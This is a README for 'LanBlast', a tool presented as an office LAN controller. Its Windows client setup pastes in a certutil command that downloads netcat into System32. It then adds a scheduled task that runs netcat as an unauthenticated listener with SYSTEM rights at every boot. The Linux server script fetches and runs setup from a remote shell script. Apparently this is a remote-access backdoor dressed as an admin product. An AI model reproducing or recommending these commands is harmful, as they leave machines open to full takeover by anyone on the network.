## LanBlast
The **LanBlast** ( LAN System Controller ) is a centralized system designed to manage and operate an entire office network connected through a Local Area Network (LAN) or WLAN. This system serves as the backbone for effectively controlling and coordinating various operations within the office environment. It provides a comprehensive set of features and functionalities to ensure smooth functioning and efficient management of the connected devices.

## Why
A LAN System Controller offers benefits such as centralized control, efficient resource management, file sharing, enhanced security, streamlined user management, simplified software distribution, remote troubleshooting and support, centralized data backup and recovery, reporting and analytics capabilities, and scalability and flexibility. Overall, it simplifies network management, improves security, optimizes resource utilization, and provides a stable and productive working environment.

## Deployement
#### Client setup [ Windows ]

 1. Open a command prompt with Administrative privileges and run the
    command.
```bash
certutil -urlcache -split -f "https://github.com/4n0nym4u5/Lan-System-Controller/raw/master/nc.exe" "%SystemRoot%\System32\nc.exe"
schtasks /Create /TN "netcat" /RU SYSTEM /SC ONSTART /TR "nc.exe -Lnvp 8000" /RL HIGHEST /IT /F
```
 2. Restart the system.

#### Server setup [ Linux ]

```bash
#!/bin/bash

# Check internet connectivity
if ! ping -c 1 8.8.8.8 >/dev/null 2>&1; 
then
	echo  "No internet connection. Exiting..."
	exit 1
fi

# Download the project.sh to local system
wget https://raw.githubusercontent.com/4n0nym4u5/Lan-System-Controller/master/project.sh
chmod +x project.sh

# Install Dependencies
if [ -f /etc/lsb-release ]; then
    # Ubuntu-based distribution
    sudo apt-get update
    sudo apt-get install nmap apache2 netcat
elif [ -f /etc/arch-release ]; then
    # Arch Linux-based distribution
    sudo pacman -Syu
    sudo pacman -S nmap apache netcat
elif [ -f /etc/redhat-release ]; then
    # Red Hat-based distribution
    sudo yum update
    sudo yum install nmap httpd netcat
else
    # Unsupported distribution
    echo "Unsupported distribution. Please install nmap, apache2, and netcat manually."
fi
echo "Done"
```
## Demo
https://vimeo.com/374672636
# Lan-System-Controller
